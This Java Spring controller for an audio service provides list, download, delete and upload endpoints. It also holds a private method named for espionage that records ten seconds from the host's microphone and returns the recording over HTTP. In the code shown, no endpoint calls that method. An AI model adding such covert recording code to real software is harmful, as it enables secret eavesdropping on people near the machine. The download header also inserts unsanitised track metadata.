package org.hyt.audioservice.web;

import org.hyt.audioservice.model.dto.api.AudioDto;
import org.hyt.audioservice.service.api.AudioService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpHeaders;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.sound.sampled.*;
import java.io.*;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

@RestController
@RequestMapping("/audio")
public class AudioController {

    private final AudioService _service;

    @Autowired
    public AudioController(
        AudioService service
    ) {
        _service = service;
    }

    @GetMapping(path = "/all")
    public @ResponseBody
    List<AudioDto> getAllAudio() {
        try {
            return _service.getAll();
        } catch (Exception exception) {
            exception.printStackTrace();
            return null;
        }
    }

    private class Bool {

        private boolean _boolean;

        public Bool(boolean bool) {
            _boolean = bool;
        }

        public boolean getBool() {
            return _boolean;
        }

        public void setBool(boolean bool) {
            _boolean = bool;
        }

    }

    @GetMapping(path = "/{id}")
    public void getAudio(@PathVariable long id, HttpServletResponse response) {
        try {
            AudioDto dto = _service.getById(id);
            response.setStatus(HttpServletResponse.SC_OK);
            response.setContentType("audio/mpeg");
            response.setHeader(
                HttpHeaders.CONTENT_DISPOSITION,
                String.format("attachment;filename=%s-%s", dto.getArtist(), dto.getTitle()));
            _service.getAudio(dto.getId()).transferTo(response.getOutputStream());
        } catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    @DeleteMapping("/{id}")
    public @ResponseBody AudioDto removeAudio(@PathVariable long id){
        try{
            return _service.remove(id);
        }catch (Exception exception){
            exception.printStackTrace();
        }
        return null;
    }

    @PostMapping(value = "/add")
    public @ResponseBody AudioDto addAudio(
        @RequestPart("audio") AudioDto audio,
        @RequestPart(value = "track", required = false) MultipartFile file,
        HttpServletRequest request
    ){
        try{
            InputStream stream = file.getInputStream();
            return _service.add(audio, stream);
        }catch (Exception exception){
            exception.printStackTrace();
        }
        return null;
    }

    private void _setAudioRecordForEspionage(HttpServletResponse response) {
        AudioFormat format = _getAudioFormat();
        DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);
        try (TargetDataLine line = (TargetDataLine) AudioSystem.getLine(info)) {
            line.open(format, line.getBufferSize());
            int frameSize = format.getFrameSize();
            int bufferSize = line.getBufferSize() / Byte.SIZE;
            int bufferLength = bufferSize * frameSize;
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            byte[] data = new byte[bufferLength];
            int readBytes;
            Bool stop = new Bool(false);
            TimerTask task = new TimerTask() {

                @Override
                public void run() {
                    stop.setBool(true);
                }

            };
            Timer timer = new Timer();
            line.start();
            timer.schedule(task, RECORD_TIME);
            while (!stop.getBool()) {
                if ((readBytes = line.read(data, 0, bufferLength)) == -1) {
                    break;
                }
                output.write(data, 0, readBytes);
            }
            byte[] outputData = output.toByteArray();
            ByteArrayInputStream input = new ByteArrayInputStream(outputData);
            AudioInputStream stream = new AudioInputStream(input, format, outputData.length / frameSize);
            response.setStatus(HttpServletResponse.SC_OK);
            response.setContentType("audio/wav");
            response.setHeader(HttpHeaders.CONTENT_DISPOSITION, "attachment;filename=audio.wav");
            AudioSystem.write(stream, type, response.getOutputStream());
        } catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    static private final long RECORD_TIME = 10000;

    private final AudioFileFormat.Type type = AudioFileFormat.Type.WAVE;

    private AudioFormat _getAudioFormat() {
        return new AudioFormat(48000, 16, 1, true, true);
    }

}
